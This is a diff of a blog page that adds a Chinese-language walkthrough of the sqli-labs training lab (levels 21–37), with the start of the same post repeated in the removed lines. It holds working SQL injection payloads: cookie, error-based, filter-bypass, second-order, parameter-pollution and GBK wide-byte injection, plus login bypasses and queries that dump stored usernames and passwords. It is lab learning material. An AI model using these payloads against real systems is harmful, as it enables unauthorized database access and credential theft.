@@ -859,6 +859,218 @@
 
 
   
+    <article id="post-sqli-labs刷题记录page-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/" class="article-date">
+      <time datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/">sqli-labs刷题记录page-2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h3 id="less-21—复杂的字符型Cookie注入"><a href="#less-21—复杂的字符型Cookie注入" class="headerlink" title="less 21—复杂的字符型Cookie注入"></a>less 21—复杂的字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303223610729.png" alt="image-20220303223610729"></p>
+<p>和上一关的区别在于cookie进行了base64编码以及闭合方式不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;) union select user(),version(),database()#</span><br><span class="line">加密后为：</span><br><span class="line">dGVzdCcpIHVuaW9uIHNlbGVjdCB1c2VyKCksdmVyc2lvbigpLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>
+
+<p>按照less20，可以得到</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303224804084.png" alt="image-20220303224804084"></p>
+<h3 id="less-22—双引号字符型Cookie注入"><a href="#less-22—双引号字符型Cookie注入" class="headerlink" title="less 22—双引号字符型Cookie注入"></a>less 22—双引号字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303225057977.png" alt="image-20220303225057977"></p>
+<p>和上一关比只是修改了闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&quot; union select user(),version(),database()#</span><br><span class="line">base64加密后：</span><br><span class="line">dGVzdCIgdW5pb24gc2VsZWN0IHVzZXIoKSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM=</span><br></pre></td></tr></table></figure>
+
+<h3 id="less-23—基于错误的，过滤注释的GET型"><a href="#less-23—基于错误的，过滤注释的GET型" class="headerlink" title="less 23—基于错误的，过滤注释的GET型"></a>less 23—基于错误的，过滤注释的GET型</h3><p>这道题思路很多，这里主要是通过过滤不严格，采用了别的效果的注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and updatexml(1,concat(0x7e,(select@@version),0x7e),1);%00</span><br></pre></td></tr></table></figure>
+
+<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
+<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319083336671.png" alt="image-20220319083336671"></p>
+<h3 id="less-24—二次注入"><a href="#less-24—二次注入" class="headerlink" title="less 24—二次注入"></a>less 24—二次注入</h3><p>先进行注册新账号，<code>admin&#39;#</code></p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207110513722.png" alt="image-20220207110513722"></p>
+<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，逻辑是这样的：提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
+<p>忘记密码：左下角的忘记密码选项提示：如果你忘记密码 请 hack it<br>新建用户：右下角新建用户可以新建一个自己的用户</p>
+<p>进行登录后修改密码</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207112655750.png" alt="image-20220207112655750"></p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113315330.png" alt="image-20220207113315330"></p>
+<p>再次用admin账号登录时，使用修改过的密码即可以登录，这两个账号的密码一样</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113421229.png" alt="image-20220207113421229"></p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less 25"></a>less 25</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084551067.png" alt="image-20220319084551067"></p>
+<p>id 直接单引号拼接，但是被如下函数过滤了</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084705752.png" alt="image-20220319084705752"></p>
+<p>过滤了 or 和 and 关键词，简单绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’||extractvalue(1,concat(0x7e,database()))–+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084817977.png" alt="image-20220319084817977"></p>
+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p><code>id=$id</code>，与 Less-25 相比，只是拼接方式改变，但因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+			#联合查询时，注意把前面的数据置否</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users) -–+</span><br></pre></td></tr></table></figure>
+
+<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR<br><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085054071.png" alt="image-20220319085054071"></p>
+<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR</p>
+<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less 26"></a>Less 26</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085351658.png" alt="image-20220319085351658"></p>
+<p>id&#x3D;’$id’</p>
+<p>过滤了or 和 and 大小写，过滤了 &#x2F;、 *、 –、 #、 空格、 斜线</p>
+<p>?id&#x3D;1’发现存在报错注入</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085851955.png" alt="image-20220319085851955"></p>
+<p>?id&#x3D;”闭合了</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085938644.png" alt="image-20220319085938644"></p>
+<p>?id&#x3D;’||’</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090017928.png" alt="image-20220319090017928"></p>
+<p>直接使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less 26a"></a>Less 26a</h3><blockquote>
+<p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;(‘$id’) LIMIT 0,1”;</p>
+</blockquote>
+<p>拼接方式改变</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)||(&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>页面回显正常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100’%0Bunion%0Bselect%0B1,2,3%0Baandnd%0B’1’=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less 27"></a>Less 27</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090517379.png" alt="image-20220319090517379"></p>
+<p>直接使用报错输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090635726.png" alt="image-20220319090635726"></p>
+<p>字过滤，空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’%0Bununionion%0BseLect%0B1,2,3%0Band%0B’1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090755421.png" alt="image-20220319090755421"></p>
+<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less 28"></a>Less 28</h3><p>id&#x3D;(‘$id’)</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319091147465.png" alt="image-20220319091147465"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)  %0a order  %0a  by %0a  3 ;%00 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319092745410.png" alt="image-20220319092745410"></p>
+<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less 29"></a>Less 29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093507400.png" alt="image-20220319093507400"></p>
+<p>查看<strong>login.php</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># 查询 query 的字符串</span><br><span class="line">$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"># 模拟 tomcat 的查询函数 处理一下</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line"># 再次过滤检测</span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">if 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line">else:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    # &amp; 作为分隔符 分割字符串</span><br><span class="line">    $qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">    # 遍历 qs_array 数组</span><br><span class="line">    foreach($qs_array as $key =&gt; $value)</span><br><span class="line">    &#123;    </span><br><span class="line">        $val=substr($value,0,2);</span><br><span class="line">        # 如果数组前两位是 id 的话</span><br><span class="line">        if($val==&quot;id&quot;)</span><br><span class="line">        &#123;    </span><br><span class="line">            # 截取 $value 的3-30 的字符串 作为 id 的值 </span><br><span class="line">            $id_value=substr($value,3,30); </span><br><span class="line">            return $id_value;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">    # 过滤规则 检测数字</span><br><span class="line">    $match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">    if 不符合规则：</span><br><span class="line">        header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">可以发现，问题出现在：</span><br><span class="line"></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">...</span><br><span class="line">whitelist($id1);</span><br><span class="line">whitelist过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 &#x27;hacked.php&#x27;，这里是没毛病的。那么问题出在了这里函数&#x27;$id1=java_implimentation($qs)&#x27;;</span><br><span class="line"></span><br><span class="line">因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id_value，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</span><br><span class="line"></span><br><span class="line">假设用户输入这样的语句：</span><br><span class="line">index.php?id=1&amp;id=2</span><br><span class="line">Apache PHP 会解析最后一个参数</span><br><span class="line">Tomcat JSP 会解析第一个参数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less 30"></a>Less 30</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093945598-1653725870448.png" alt="image-20220319093945598"></p>
+<p>和less29没什么本质变化，只是拼接方式不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094255229.png" alt="image-20220319094255229"></p>
+<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less 31"></a>Less 31</h3><p><code>id=（&quot;$id&quot;）</code></p>
+<p>直接构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094421820.png" alt="image-20220319094421820"></p>
+<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less 32"></a>Less 32</h3><p>构造?id&#x3D;1，发现回显正常</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130200518028.png" alt="image-20220130200518028"></p>
+<p>构造?id&#x3D;1’</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130201230423.png" alt="image-20220130201230423"></p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094950654.png" alt="image-20220319094950654"></p>
+<p>这里输入的’直接被转义成\了，一般情况下，是不存在SQL注入的，不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式时在地址后先加一个%df，再加一个单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL的数据库错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131102727746.png" alt="image-20220131102727746"></p>
+<p>根据错误判断闭合方式为’-+，并且为字符型注入，确定回显位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; order by 1(/2/3/4)--+</span><br></pre></td></tr></table></figure>
+
+<p>这里括号里是或，从1~4,最终到4时回显Unknown column ‘4’ in ‘order clasue’，说明爆出的字段数为3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103344678.png" alt="image-20220131103344678"></p>
+<p>查看当前库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103704301.png" alt="image-20220131103704301"></p>
+<p>查看security库下的所有表</p>
+<p>由于单引号被转义了，所以不能输入<code>tabel_schema=&#39;security&#39;</code>，这里输入为<code>table_schema=database()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103939361.png" alt="image-20220131103939361"></p>
+<p>查看users表下的所有字段，这里的单引号也被转义，所以将users转化为16进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104142610.png" alt="image-20220131104142610"></p>
+<p>查看usename,password字段下的所有值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,password) from security.users)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104542234.png" alt="image-20220131104542234"></p>
+<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less 33"></a>Less 33</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095049478.png" alt="image-20220319095049478"></p>
+<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。<br> 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095340334.png" alt="image-20220319095340334"></p>
+<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less 34"></a>Less 34</h3><p>过滤方法和less33一致，只是由GET 型变成了POST型</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095538195.png" alt="image-20220319095538195"></p>
+<p>我们用万能密码的方式的来突破这一关：</p>
+<p>username：�’ or 1&#x3D;1#<br> Password：随便填</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100052436.png" alt="image-20220319100052436"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始的 sql 语句为</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">此时 sql 语句为</span><br><span class="line">SELECT username, password FROM users WHERE username=&#x27;� &#x27; or 1=1#&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less 35"></a>Less 35</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100513064.png" alt="image-20220319100513064"></p>
+<p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：<br> ?id&#x3D;1 and updatexml(1,concat(0x7e,(select version())),1)</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100608266.png" alt="image-20220319100608266"></p>
+<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less 36"></a>Less 36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df’ and updatexml(1,concat(0x7e,(select version())),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100911685.png" alt="image-20220319100911685"></p>
+<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less 37"></a>Less 37</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101243994.png" alt="image-20220319101243994"></p>
+<p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 mysql_real_escape_string()函数，而不是 addslashes()函数，但是原理是一致的。</p>
+<p>我们直接使用之前所用过的万能密码来突破一下：</p>
+<p>username：�’ or 1&#x3D;1#</p>
+<p>password：任意</p>
+<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101400429.png" alt="image-20220319101400429"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-sqli-labs刷题记录page-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1158,218 +1370,6 @@
 
 
   
-    <article id="post-sqli-labs刷题记录page-2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/" class="article-date">
-      <time datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/">sqli-labs刷题记录page-2</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h3 id="less-21—复杂的字符型Cookie注入"><a href="#less-21—复杂的字符型Cookie注入" class="headerlink" title="less 21—复杂的字符型Cookie注入"></a>less 21—复杂的字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303223610729.png" alt="image-20220303223610729"></p>
-<p>和上一关的区别在于cookie进行了base64编码以及闭合方式不同</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;) union select user(),version(),database()#</span><br><span class="line">加密后为：</span><br><span class="line">dGVzdCcpIHVuaW9uIHNlbGVjdCB1c2VyKCksdmVyc2lvbigpLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>
-
-<p>按照less20，可以得到</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303224804084.png" alt="image-20220303224804084"></p>
-<h3 id="less-22—双引号字符型Cookie注入"><a href="#less-22—双引号字符型Cookie注入" class="headerlink" title="less 22—双引号字符型Cookie注入"></a>less 22—双引号字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303225057977.png" alt="image-20220303225057977"></p>
-<p>和上一关比只是修改了闭合方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&quot; union select user(),version(),database()#</span><br><span class="line">base64加密后：</span><br><span class="line">dGVzdCIgdW5pb24gc2VsZWN0IHVzZXIoKSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM=</span><br></pre></td></tr></table></figure>
-
-<h3 id="less-23—基于错误的，过滤注释的GET型"><a href="#less-23—基于错误的，过滤注释的GET型" class="headerlink" title="less 23—基于错误的，过滤注释的GET型"></a>less 23—基于错误的，过滤注释的GET型</h3><p>这道题思路很多，这里主要是通过过滤不严格，采用了别的效果的注释符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and updatexml(1,concat(0x7e,(select@@version),0x7e),1);%00</span><br></pre></td></tr></table></figure>
-
-<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
-<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319083336671.png" alt="image-20220319083336671"></p>
-<h3 id="less-24—二次注入"><a href="#less-24—二次注入" class="headerlink" title="less 24—二次注入"></a>less 24—二次注入</h3><p>先进行注册新账号，<code>admin&#39;#</code></p>
-<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207110513722.png" alt="image-20220207110513722"></p>
